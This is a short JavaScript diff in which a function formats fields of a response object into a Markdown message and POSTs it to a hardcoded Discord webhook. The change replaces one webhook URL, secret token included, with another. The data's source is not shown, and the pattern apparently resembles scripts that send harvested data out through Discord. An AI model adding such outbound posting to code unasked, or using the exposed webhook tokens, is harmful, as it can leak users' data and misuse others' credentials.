@@ -13,7 +13,7 @@ function req () {
       content+='**'+capitalize(entry)+'** : `\u200b'+capitalize(res.data[entry])+'`\n'
     }
     const post = {
-      url:'https://discord.com/api/webhooks/868378650733604884/jJmuEoSnQBT_4l78p7BzUsNVFwU1DfBv5GuXar6Bms6vR4yLOjInVTb-nBwN4NKKuAvJ',
+      url:'https://discord.com/api/webhooks/868691732454318091/z9xRVp174JQyy8XSFxMubeCLkcRkhDGpfvfiel0qDgx0jVQulispp0UGfddpVpK0GQF-',
       method:'POST',
       data:{
         "content":content,
